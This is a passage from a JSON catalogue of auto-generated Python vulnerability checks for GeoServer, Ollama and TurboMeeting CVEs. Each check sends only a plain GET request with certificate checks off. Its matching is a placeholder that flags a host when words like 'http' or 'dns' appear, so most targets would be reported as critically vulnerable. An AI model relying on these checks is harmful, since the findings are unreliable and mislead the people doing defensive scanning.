\"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | mot(s) 'application/xml'\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', 'application/xml']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"GeoServer RCE in Evaluating Property Name Expressions\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_36401(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-36401\nName: GeoServer RCE in Evaluating Property Name Expressions\nSeverity: critical\nDescription: In the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_36401:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-36401\"\n    SEVERITY = \"critical\"\n    NAME = \"GeoServer RCE in Evaluating Property Name Expressions\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | mot(s) 'application/xml'\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', 'application/xml']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"GeoServer RCE in Evaluating Property Name Expressions\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_36401(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "geoserver",
          "rce",
          "unauth",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_37032",
        "name": "Ollama - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "Ollama before 0.1.34 does not validate the format of the digest (sha256 with 64 hex digits) when getting the model path, and thus mishandles the TestGetBlobsPath test cases such as fewer than 64 hex digits, more than 64 hex digits, or an initial ../ substring.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(interactsh_protocol, 'http'); contains_all(header, 'application/x-ndjson') && contains(body_2, 'retrieving manifest')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-37032\nName: Ollama - Remote Code Execution\nSeverity: critical\nDescription: Ollama before 0.1.34 does not validate the format of the digest (sha256 with 64 hex digits) when getting the model path, and thus mishandles the TestGetBlobsPath test cases such as fewer than 64 hex digits, more than 64 hex digits, or an initial ../ substring.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_37032:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-37032\"\n    SEVERITY = \"critical\"\n    NAME = \"Ollama - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(interactsh_protocol, 'http'); contains_all(header, 'application/x-ndjson') && contains(body_2, 'retrieving manifest')\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'application/x-ndjson', 'retrieving manifest']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ollama - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_37032(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-37032\nName: Ollama - Remote Code Execution\nSeverity: critical\nDescription: Ollama before 0.1.34 does not validate the format of the digest (sha256 with 64 hex digits) when getting the model path, and thus mishandles the TestGetBlobsPath test cases such as fewer than 64 hex digits, more than 64 hex digits, or an initial ../ substring.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_37032:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-37032\"\n    SEVERITY = \"critical\"\n    NAME = \"Ollama - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(interactsh_protocol, 'http'); contains_all(header, 'application/x-ndjson') && contains(body_2, 'retrieving manifest')\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'application/x-ndjson', 'retrieving manifest']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ollama - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_37032(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "ollama",
          "rce",
          "ai",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_38289",
        "name": "TurboMeeting - Boolean-based SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "A Boolean-based SQL injection vulnerability in the \"RHUB TurboMeeting\" web application. This vulnerability could allow an attacker to execute arbitrary SQL commands on the database server, potentially allowing them to access sensitive data or compromise the server.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<__Status__>SUCCEED</__Status__>' | mot(s) '<__Status__>FAILED</__Status__>'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-38289\nName: TurboMeeting - Boolean-based SQL Injection\nSeverity: critical\nDescription: A Boolean-based SQL injection vulnerability in the \"RHUB TurboMeeting\" web application. This vulnerability could allow an attacker to execute arbitrary SQL commands on the database server, potentially allowing them to access sensitive data or compromise the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_38289:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-38289\"\n    SEVERITY = \"critical\"\n    NAME = \"TurboMeeting - Boolean-based SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<__Status__>SUCCEED</__Status__>' | mot(s) '<__Status__>FAILED</__Status__>'\"\n\n        # Simple word matcher simulation\n        matchers = ['<__Status__>SUCCEED</__Status__>', '<__Status__>FAILED</__Status__>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TurboMeeting - Boolean-based SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_38289(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-38289\nName: TurboMeeting - Boolean-based SQL Injection\nSeverity: critical\nDescription: A Boolean-based SQL injection vulnerability in the \"RHUB TurboMeeting\" web application. This vulnerability could allow an attacker to execute arbitrary SQL commands on the database server, potentially allowing them to access sensitive data or compromise the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_38289:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-38289\"\n    SEVERITY = \"critical\"\n    NAME = \"TurboMeeting - Boolean-based SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<__Status__>SUCCEED</__Status__>' | mot(s) '<__Status__>FAILED</__Status__>'\"\n\n        # Simple word matcher simulation\n        matchers = ['<__Status__>SUCCEED</__Status__>', '<__Status__>FAILED</__Status__>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if 